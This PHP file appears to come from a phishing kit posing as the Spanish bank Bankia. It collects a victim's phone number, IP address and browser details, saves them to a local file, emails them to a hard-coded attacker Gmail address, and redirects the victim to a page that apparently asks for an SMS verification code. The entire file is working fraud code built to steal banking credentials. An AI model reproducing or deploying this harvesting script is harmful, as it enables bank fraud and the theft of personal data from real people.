<?php




$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 

$msg.="==================================================\r\n";
$msg=" [+] TELE(BANKIA) ///logo\r\n";
$msg.="==============================\r\n";
$msg.="[+] TELEPHONE : {$_POST['phone']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../bankiwawa.txt","a+");fwrite($save,$msg);fclose($save);
$email="dr.hkrzlt@gmail.com"; //HERE
$subject="TELE(BANKIA) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: logo™<info@info.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);

header("Location: ./loading.php?link=sms_code"); 

?>